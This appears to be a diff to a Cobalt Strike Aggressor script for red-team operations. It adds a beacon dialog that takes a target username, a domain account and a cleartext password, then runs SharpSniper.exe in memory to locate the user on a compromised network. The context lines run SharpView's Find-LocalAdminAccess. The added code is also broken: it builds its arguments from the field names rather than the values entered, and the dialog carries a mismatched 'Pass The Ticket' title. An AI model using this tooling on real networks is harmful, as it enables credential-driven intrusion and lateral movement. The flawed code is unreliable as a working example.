@@ -619,3 +619,61 @@ prompt_text("Computer Name - FQDN)", "", lambda({
 bexecute_assembly($bids, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -Threads 1 -Jitter 1 -CheckShareAccess -ComputerName $1");
 }, $bids => $1));
 }
+
+#############################################
+##
+##Find User Location Function
+##
+##
+#############################################
+
+sub userloc_creds{
+ # beacon ID
+    $bid = $1;
+    
+ # command arugement variable  
+    $cmdargs = "";
+  
+ # Pop Dialog Box and control flow
+    $dialog = dialog("Pass The Ticket", %(execmethod => "Execute-Assembly"), lambda({
+ 
+ # manipulate the first argument depending on the executables command line switch statements
+ # manipulate the second argument depending on the expected input format  
+        foreach $key => $value ($3){
+            if ($value ne "" && $value ne "false" && $value ne "true" && $key ne "execmethod"){
+                $cmdargs .= $key; #User to find
+                $cmdargs .= ' ';
+                $cmdargs .= $key; #DA Creds
+                $cmdargs .= ' ';
+                $cmdargs .= $key; #DA Password 
+            }
+ # manipulate the first argument depending on the executables command line switch statements            
+            else if ($value eq "true"){
+                $cmdargs .= ' /';
+                $cmdargs .= $key;
+            }
+        }
+ # btask just displays message in beacon window
+ # execute assembly it is important to notate the use of periods for concatenating the ptt switch      
+       if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Attempting to Locate User');
+            bexecute_assembly($bid, script_resource('/exe/SharpSniper.exe'), $cmdargs);
+        }
+      
+    }));
+    
+ # Dialog box contents and text boxes mapped to command line argument keys   
+    dialog_description($dialog, "Let's Hunt Users");
+    drow_text($dialog, "",  "User to Locate");
+    drow_text($dialog, "",  "User w/DC Read Access");
+    drow_text($dialog, "",  "Cleartext Password");
+    dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
+#############################################
+##
+##End User Location Function
+##
+##
+#############################################
